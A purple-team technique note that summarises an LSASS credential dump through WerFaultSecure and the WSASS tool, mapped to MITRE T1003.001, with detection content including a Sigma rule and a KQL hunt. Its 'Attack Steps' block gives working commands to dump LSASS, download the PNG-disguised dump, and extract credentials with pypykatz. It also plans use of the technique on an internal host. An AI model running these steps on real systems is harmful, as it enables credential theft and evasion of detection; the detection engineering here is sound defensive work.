# LSASS Dump via Windows Error Reporting (WerFaultSecure)

> **Source:** https://ipurple.team/2025/11/18/lsass-dump-windows-error-reporting/
> **Date:** 2025-11-18
> **MITRE:** T1003.001 (OS Credential Dumping: LSASS Memory)
> **CADRE mapping:** Campaign_suggestions.md #20, Branch 3.5F

---

## What It Is

WerFaultSecure.exe is a Microsoft-signed binary (PPL protected) that dumps process memory during crashes. The WSASS tool uses an older version of WerFaultSecure (from Windows 8.1) that writes non-encrypted MiniDump files. The dump file header is replaced with PNG header to evade detection.

## Tool

[WSASS](https://github.com/TwoSevenOneT/WSASS) — requires path to WerFaultSecure.exe + LSASS PID.

## Attack Steps

```bash
# 1. Dump LSASS (requires Local Admin)
shell WSASS.exe "C:\path\to\WerFaultSecure.exe" <lsass-PID>

# 2. Exfiltrate (file saved as proc.png with PNG header)
download proc.png

# 3. Fix header (replace PNG magic with MiniDump magic)
# PNG: 89 50 4E 47 → MiniDump: 4D 44 4D 50
hexeditor proc.png

# 4. Extract credentials
pypykatz lsa minidump proc.png
```

## Why It Works

- WerFaultSecure is Microsoft-signed and runs as PPL (WinTCB level)
- Can interact with other PPL processes like LSASS
- Non-encrypted dump from older binary version
- PNG header replacement evades file-type detection

## Limitations

- Works on Windows 10/11
- Credential Guard on Windows 11 limits what's extractable (LSAIso.exe isolation)
- Requires Local Admin privileges
- File size is large (~83MB) — strong indicator

## Detection

| Data Source | Event ID | Detects |
|------------|----------|---------|
| Windows Events | 4688 | Process Creation (WSASS, WerFaultSecure) |
| Sysmon | 1 | Process Create + Command Line |
| Sysmon | 11 | File Create (proc.png) |
| Sysmon | 10 | Process Access (LSASS) |
| Windows Events | 4663 | Processes Accessing MiniDump |

### SIGMA Rule

```yaml
title: WerFaultSecure.exe executed outside system paths
detection:
  selection_image:
    Image|endswith: '\WerFaultSecure.exe'
  filter_system_paths:
    Image|startswith:
      - 'C:\Windows\System32\'
      - 'C:\Windows\SysWOW64\'
  condition: selection_image and not filter_system_paths
level: high
```

### File Size Hunting

```kql
DeviceFileEvents
| where tolower(FileName) endswith ".png"
| where FileSize >= 10485760  // 10 MB
| where ActionType in ("FileCreated", "FileRenamed")
```

### Command Line Arguments

WerFaultSecure is invoked with undocumented args: `/h /pid <PID> /tid <TID> /file <handle> /encfile <handle> /cancel <handle> /type 268310`

## CADRE Application

- Alternative to procdump for LSASS dump on mbr01
- Stealthier than procdump (Microsoft-signed binary)
- Test from SYSTEM via GodPotato → compare telemetry with 3.5F procdump approach
- Detection: Sysmon EID 1 (WerFaultSecure outside System32), EID 11 (proc.png), EID 10 (LSASS access)

---

*Last updated: 2026-06-09*
